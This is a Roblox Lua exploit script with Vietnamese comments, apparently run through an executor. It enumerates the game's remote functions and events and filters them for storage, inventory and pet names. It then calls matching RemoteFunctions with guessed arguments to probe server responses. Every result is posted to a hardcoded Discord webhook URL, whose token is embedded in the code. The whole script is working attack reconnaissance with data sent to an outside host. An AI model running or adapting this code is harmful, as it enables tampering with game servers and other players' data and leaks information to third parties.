-- Tìm Remote liên quan đến Storage/Inventory
local W="https://discord.com/api/webhooks/1502609152025952338/9TmUzZ2jRGfdu0tNYMz7lci6s42oYO1Pxj6MvlAU_x8qiMTxcU2awczwsHeYb3SaCDsD"
local Http=game:GetService("HttpService")
local RS=game:GetService("ReplicatedStorage")
local plr=game:GetService("Players").LocalPlayer

local function d(msg,c) pcall(function() request({Url=W,Method="POST",Headers={["Content-Type"]="application/json"},Body=Http:JSONEncode({embeds={{description=msg,color=c or 0x00ccff}}})}) end) wait(1) end

d("🔍 **TÌM REMOTE STORAGE** | `"..plr.Name.."`", 0xffaa00)

-- =====================================================
-- 1. Liệt kê tất cả RemoteFunction + RemoteEvent trong RS
-- =====================================================
local remoteLines = {}
local function scanRemotes(obj, prefix, depth)
    if depth > 4 then return end
    for _, child in ipairs(obj:GetChildren()) do
        local cname = child.ClassName
        if cname == "RemoteFunction" or cname == "RemoteEvent" or cname == "BindableFunction" then
            table.insert(remoteLines, cname:sub(1,2)..": "..prefix..child.Name)
        end
        if child:GetChildren and #child:GetChildren() > 0 then
            scanRemotes(child, prefix..child.Name.."/", depth+1)
        end
    end
end
scanRemotes(RS, "", 0)
scanRemotes(game:GetService("Players").LocalPlayer, "Player/", 0)

-- Filter những remote có tên liên quan đến storage/inventory/pet/bag
local keywords = {"storage","inventory","pet","bag","item","save","load","get","fetch","profile","equip"}
local relevant = {}
local all = {}
for _, line in ipairs(remoteLines) do
    table.insert(all, line)
    local lower = line:lower()
    for _, kw in ipairs(keywords) do
        if lower:find(kw) then
            table.insert(relevant, "⭐ "..line)
            break
        end
    end
end

-- Gửi relevant trước
if #relevant > 0 then
    local chunks = {}
    for i=1,#relevant,20 do
        local c={}
        for j=i,math.min(i+19,#relevant) do table.insert(c,relevant[j]) end
        table.insert(chunks, table.concat(c,"\n"))
    end
    for _,chunk in ipairs(chunks) do
        d("⭐ **Relevant Remotes:**\n```\n"..chunk.."\n```", 0x00ff88)
    end
else
    d("⚠️ Không tìm được remote liên quan", 0xff8800)
end

-- Gửi tất cả (batch 30)
d("📋 **Tất cả Remotes ("..#all.."):**", 0x5599ff)
for i=1,#all,30 do
    local c={}
    for j=i,math.min(i+29,#all) do table.insert(c,all[j]) end
    d("```\n"..table.concat(c,"\n").."\n```", 0x5599ff)
    wait(0.5)
end

-- =====================================================
-- 2. Thử invoke các RemoteFunction có tên Storage/Get
-- =====================================================
d("🔄 **Thử invoke Storage remotes...**", 0xffaa00)
local function tryInvoke(rf)
    local results = {}
    -- Thử với nhiều param
    for _, args in ipairs({ {}, {plr}, {plr.UserId}, {"Storage"}, {"Pets"} }) do
        local ok, res = pcall(function()
            return rf:InvokeServer(table.unpack(args))
        end)
        if ok and res ~= nil then
            local info = type(res)
            if type(res)=="table" then
                local cnt=0; for _ in pairs(res) do cnt=cnt+1 end
                info = "table["..cnt.."]"
                -- Sample
                for k,v in pairs(res) do info=info.." "..tostring(k).."="..type(v); break end
            end
            table.insert(results, "args=("..#args..") → "..info)
        end
    end
    return results
end

local allRF = {}
local function findRF(obj, depth)
    if depth>4 then return end
    for _,child in ipairs(obj:GetChildren()) do
        if child.ClassName=="RemoteFunction" then
            local lower=child.Name:lower()
            if lower:find("storage") or lower:find("inventory") or lower:find("pet") or lower:find("get") then
                table.insert(allRF, child)
            end
        end
        if #child:GetChildren()>0 then findRF(child, depth+1) end
    end
end
findRF(RS, 0)

for _, rf in ipairs(allRF) do
    local results = tryInvoke(rf)
    if #results > 0 then
        d("✅ **"..rf.Name..":**\n```\n"..table.concat(results,"\n").."\n```", 0x00ff88)
    end
    wait(0.5)
end

d("✅ **SCAN XONG!**", 0x00ff88)
